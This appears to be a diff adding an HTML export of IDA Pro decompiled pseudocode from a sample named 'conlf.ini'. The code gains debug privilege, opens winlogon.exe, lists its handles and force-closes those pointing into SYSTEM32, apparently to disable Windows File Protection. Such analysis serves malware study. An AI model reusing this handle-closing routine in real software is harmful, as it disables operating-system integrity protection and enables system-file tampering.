@@ -1,0 +1,95 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>IDA - C:\Documents and Settings\Administrator\Desktop\conlf.idb (conlf.ini)</title>
+</head>
+<body bgcolor="white">
+<span style="white-space: pre; font-family: FixedSys; color: blue; background: white">
+
+<span style="color:gray">void __cdecl start()
+</span><span style="color:navy">{
+  </span><span style="color:gray">HMODULE hNtdll</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">eax@1
+  </span><span style="color:gray">HMODULE hNtdll2</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">eax@1
+  </span><span style="color:gray">int v2</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">edx@5
+  </span><span style="color:gray">SYSTEM_HANDLE_INFORMATION *hTable</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">ecx@5
+  </span><span style="color:gray">SYSTEM_HANDLE_TABLE_ENTRY_INFO *hEntry</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">edi@5
+  </span><span style="color:gray">HANDLE hCurrentProcess</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">eax@7
+  </span><span style="color:gray">SYSTEM_HANDLE_TABLE_ENTRY_INFO *v6</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[sp-3Ch] [bp-3Ch]@8
+  </span><span style="color:gray">int v7</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[sp-38h] [bp-38h]@14
+  </span><span style="color:gray">SYSTEM_HANDLE_INFORMATION *v8</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[sp-34h] [bp-34h]@14
+  </span><span style="color:gray">int v9</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[sp-28h] [bp-28h]@6
+  </span><span style="color:gray">SYSTEM_HANDLE_INFORMATION *v10</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[sp-24h] [bp-24h]@6
+
+  </span>EnableDebug<span style="color:navy">();
+  </span><span style="color:#8080ff">hNtdll </span><span style="color:navy">= </span>GetModuleHandleA<span style="color:navy">(&quot;</span><span style="color:green">NTDLL.DLL&quot;</span><span style="color:navy">);
+  </span>NtQuerySystemInformation <span style="color:navy">= </span>GetProcAddress<span style="color:navy">(</span><span style="color:#8080ff">hNtdll</span><span style="color:navy">, &quot;</span><span style="color:green">NtQuerySystemInformation&quot;</span><span style="color:navy">);
+  </span><span style="color:#8080ff">hNtdll2 </span><span style="color:navy">= </span>GetModuleHandleA<span style="color:navy">(&quot;</span><span style="color:green">NTDLL.DLL&quot;</span><span style="color:navy">);
+  </span>NtQueryObject <span style="color:navy">= </span>GetProcAddress<span style="color:navy">(</span><span style="color:#8080ff">hNtdll2</span><span style="color:navy">, &quot;</span><span style="color:green">NtQueryObject&quot;</span><span style="color:navy">);
+  </span>winlogon_pid <span style="color:navy">= </span>GetPidFromName<span style="color:navy">(&quot;</span><span style="color:green">winlogon.exe&quot;</span><span style="color:navy">);
+  </span>hSourceProcessHandle <span style="color:navy">= </span>OpenProcess<span style="color:navy">(</span>PROCESS_DUP_HANDLE<span style="color:navy">, 0, </span>winlogon_pid<span style="color:navy">);
+  if ( </span>NtQuerySystemInformation<span style="color:navy">(</span>SystemHandleInformation<span style="color:navy">, 0, 0, &amp;</span>dwSize<span style="color:navy">) == STATUS_INFO_LENGTH_MISMATCH )
+  {
+    do
+    {
+      </span>dwSize <span style="color:navy">+= 4096;
+      if ( </span>lpAddress <span style="color:navy">)
+        </span>VirtualFree<span style="color:navy">(</span>lpAddress<span style="color:navy">, 0, 0x8000u);
+      </span>lpAddress <span style="color:navy">= </span>VirtualAlloc<span style="color:navy">(0, </span>dwSize<span style="color:navy">, </span>MEM_COMMIT<span style="color:navy">, </span>PAGE_READWRITE<span style="color:navy">);
+    </span><span style="background:navy"></span><span style="color:navy">}
+    while ( </span>NtQuerySystemInformation<span style="color:navy">(</span>SystemHandleInformation<span style="color:navy">, </span>lpAddress<span style="color:navy">, </span>dwSize<span style="color:navy">, &amp;</span>retLength<span style="color:navy">) == STATUS_INFO_LENGTH_MISMATCH );
+  </span><span style="background:navy"></span><span style="color:navy">}
+  </span><span style="color:#8080ff">hTable </span><span style="color:navy">= *</span>lpAddress<span style="color:navy">;
+  </span><span style="color:#8080ff">hEntry </span><span style="color:navy">= (</span>lpAddress <span style="color:navy">+ 4);
+  </span><span style="color:#8080ff">v2 </span><span style="color:navy">= 0;
+  while ( 1 )
+  {
+    </span><span style="color:#8080ff">v10 </span><span style="color:navy">= </span><span style="color:#8080ff">hTable</span><span style="color:navy">;
+    </span><span style="color:#8080ff">v9 </span><span style="color:navy">= </span><span style="color:#8080ff">v2</span><span style="color:navy">;
+    if ( *&amp;</span><span style="color:#8080ff">hEntry</span><span style="color:navy">-&gt;UniqueProcessId != </span>winlogon_pid <span style="color:navy">)
+      goto next_handle;
+    </span><span style="color:#8080ff">hCurrentProcess </span><span style="color:navy">= </span>GetCurrentProcess<span style="color:navy">();
+    if ( </span>DuplicateHandle<span style="color:navy">(
+           </span>hSourceProcessHandle<span style="color:navy">,
+           </span><span style="color:#8080ff">hEntry</span><span style="color:navy">-&gt;HandleValue,
+           </span><span style="color:#8080ff">hCurrentProcess</span><span style="color:navy">,
+           &amp;</span>TargetHandle<span style="color:navy">,
+           0,
+           0,
+           DUPLICATE_SAME_ACCESS) )
+    {
+      if ( !</span>NtQueryObject<span style="color:navy">(</span>TargetHandle<span style="color:navy">, </span>ObjectNameInformation<span style="color:navy">, &amp;</span>pObjectName<span style="color:navy">, 532, 0</span><span style="color:navy">) )
+      {
+        </span>CharUpperW<span style="color:navy">(</span>pObjectName<span style="color:navy">.Name.Buffer);
+        if ( </span>strstrW<span style="color:navy">(</span><span style="color:green">L&quot;WINDOWS\\SYSTEM32&quot;</span><span style="color:navy">, </span>pObjectName<span style="color:navy">.Name.Buffer) == 1
+          || </span>strstrW<span style="color:navy">(</span><span style="color:green">L&quot;WINNT\\SYSTEM32&quot;</span><span style="color:navy">, </span>pObjectName<span style="color:navy">.Name.Buffer) == 1 )
+        {
+          </span>CloseHandle<span style="color:navy">(</span>TargetHandle<span style="color:navy">);
+          </span>DuplicateHandle<span style="color:navy">(
+            </span>hSourceProcessHandle<span style="color:navy">,
+            </span><span style="color:#8080ff">hEntry</span><span style="color:#8080ff">-&gt;HandleValue,
+            hCurrentProcess,
+            &amp;</span>TargetHandle<span style="color:navy">,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);                                </span>
+          CloseHandle<span style="color:navy">(</span>TargetHandle<span style="color:navy">);
+          goto next_handle;
+        </span><span style="background:navy"></span><span style="color:navy">}
+      </span><span style="background:blue"></span><span style="color:navy">}
+      </span><span style="color:#8080ff">hEntry </span><span style="color:navy">= </span><span style="color:#8080ff">v6</span><span style="color:navy">;
+    </span><span style="background:#8080ff"></span><span style="color:navy">}
+    </span>CloseHandle<span style="color:navy">(</span>TargetHandle<span style="color:navy">);
+next_handle:
+    </span><span style="color:#8080ff">hTable </span><span style="color:navy">= </span><span style="color:#8080ff">v8</span><span style="color:navy">;
+    </span><span style="color:#8080ff">v2 </span><span style="color:navy">= </span><span style="color:#8080ff">v7 </span><span style="color:navy">+ 1;
+    if ( </span><span style="color:#8080ff">v7 </span><span style="color:navy">+ 1 &gt;= </span><span style="color:#8080ff">v8 </span><span style="color:navy">)
+    {
+      </span>VirtualFree<span style="color:navy">(</span>lpAddress<span style="color:navy">, 0, 0x8000u);
+      </span>CloseHandle<span style="color:navy">(</span>hSourceProcessHandle<span style="color:navy">);
+      </span>TerminateProcess<span style="color:navy">(hCurrentProcess, 0);
+    </span><span style="background:navy"></span><span style="color:navy">}
+    ++</span><span style="color:#8080ff">hEntry</span><span style="color:navy">;
+  </span><span style="background:#8080ff"></span><span style="color:navy">}
+</span><span style="background:blue"></span><span style="color:navy">}
+</span></body></html>
